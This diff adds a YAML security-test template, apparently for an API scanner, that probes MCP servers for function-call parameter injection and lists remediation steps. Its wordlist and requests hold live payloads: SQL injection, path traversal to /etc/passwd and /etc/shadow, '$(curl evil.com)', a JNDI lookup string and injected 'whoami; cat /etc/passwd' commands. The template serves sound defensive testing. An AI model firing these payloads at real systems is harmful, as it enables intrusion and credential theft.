@@ -1,0 +1,134 @@
+---
+id: MCP_FUNCTION_CALL_PARAMETER_INJECTION
+info:
+  name: Function Call Manipulation - Parameter Injection (MCP)
+  description: |
+    Tests whether malicious parameters can be injected into function calls to manipulate their behavior or access unauthorized data.
+  details: |
+    According to the Promptfoo MCP Plugin documentation, parameter injection involves "crafting malicious inputs to inject unwanted parameters." This test attempts to inject additional or malicious parameters into function calls that could alter the intended behavior, bypass security controls, or access unauthorized resources.<br>
+    <b>Background:</b> Many MCP tools accept parameters that control their behavior. If these parameters are not properly validated or sanitized, attackers can inject additional parameters, modify existing ones, or use special values to manipulate function execution. This is particularly dangerous when functions interact with databases, file systems, or external APIs.
+  impact: |
+    Successful parameter injection can lead to:
+    1. SQL injection through database query parameters
+    2. Path traversal through file operation parameters
+    3. Command injection through system call parameters
+    4. Authorization bypass by modifying user/role parameters
+    5. Data exfiltration by injecting filter/query parameters
+    6. Business logic bypass through parameter manipulation
+  remediation: |
+    To prevent function call parameter injection vulnerabilities:
+    
+    1. **Input Validation**: Implement strict input validation for all function parameters. Validate parameter types, formats, and ranges before processing.
+    
+    2. **Parameter Sanitization**: Sanitize all parameter values to remove or escape special characters, SQL injection patterns, and command injection attempts.
+    
+    3. **Type Checking**: Enforce strict type checking for all parameters. Reject requests with incorrect parameter types or unexpected data formats.
+    
+    4. **Parameter Allowlisting**: Use allowlists for parameter values where possible. Only permit predefined, safe values for critical parameters.
+    
+    5. **SQL Injection Prevention**: Use parameterized queries and prepared statements for database operations. Never concatenate user input directly into SQL queries.
+    
+    6. **Path Traversal Prevention**: Validate and sanitize file paths. Use canonical path resolution and restrict access to authorized directories only.
+    
+    7. **Command Injection Prevention**: Avoid executing system commands with user input. Use safe alternatives like parameterized APIs or whitelisted command patterns.
+    
+    8. **Authorization Validation**: Implement proper authorization checks for all parameters that could affect user permissions or access levels.
+    
+    9. **Input Encoding**: Properly encode all user input before using it in different contexts (HTML, SQL, shell commands, etc.).
+    
+    10. **Error Handling**: Implement secure error handling that doesn't reveal information about parameter validation failures or internal system details.
+    
+    11. **Logging and Monitoring**: Log all parameter injection attempts and monitor for suspicious patterns in function calls.
+    
+    12. **Regular Security Testing**: Conduct regular security testing to identify and fix parameter injection vulnerabilities.
+  category:
+    name: MCP_FUNCTION_MANIPULATION
+    shortName: MCP_FUNC_MANIP
+    displayName: Model Context Protocol (MCP) Security - Function Call Manipulation
+  subCategory: MCP_FUNCTION_CALL_PARAMETER_INJECTION
+  severity: HIGH
+  tags:
+    - Parameter Injection
+    - Function Manipulation
+    - Input Validation
+    - MCP
+    - AI/LLM Security
+  references:
+    - https://www.promptfoo.dev/docs/red-team/plugins/mcp/
+    - https://owasp.org/www-project-api-security/
+    - https://cwe.mitre.org/data/definitions/89.html
+  cwe:
+    - CWE-89
+    - CWE-78
+    - CWE-20
+    - CWE-74
+  cve:
+    - CVE-2023-38254
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+api_selection_filters:
+  method:
+    eq: POST
+  response_code:
+    gte: 200
+    lt: 300
+  request_payload:
+    contains_all:
+      - jsonrpc
+      - method
+      - params
+    for_one:
+      key:
+        regex: .*
+        extractMultiple: payloadKeys
+
+wordLists:
+
+  injectionPayloads:
+    - "'; DROP TABLE users; --"
+    - "1' OR '1'='1"
+    - "../../../etc/passwd"
+    - "$(curl evil.com)"
+    - "`whoami`"
+    - "; cat /etc/shadow #"
+    - "admin' --"
+    - "{{7*7}}"
+    - "${jndi:ldap://evil.com/a}"
+    - "<!--#exec cmd=\"ls\" -->"
+
+execute:
+  type: multiple
+  requests:
+    # Test 1: SQL injection in parameter
+    - req:
+        - add_body_param:
+            params.arguments.${payloadKeys}: "${injectionPayloads}"
+        # Test 2: Add malicious extra parameters
+        - add_body_param:
+            params.arguments.admin: "true"
+        - add_body_param:
+            params.arguments.bypass_auth: "1"
+        - add_body_param:
+            params.arguments.privileged: "true"
+        # Test 3: Inject command execution parameters
+        - modify_body_param:
+            params.arguments.command: "whoami; cat /etc/passwd"
+        - add_body_param:
+            params.arguments.shell: "/bin/bash"
+validate:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    not_contains:
+      - Error
+      - error
+      - Invalid parameter
+      - injection detected
+      - malicious input
+      - validation failed
+      - unauthorized
+      - forbidden
+
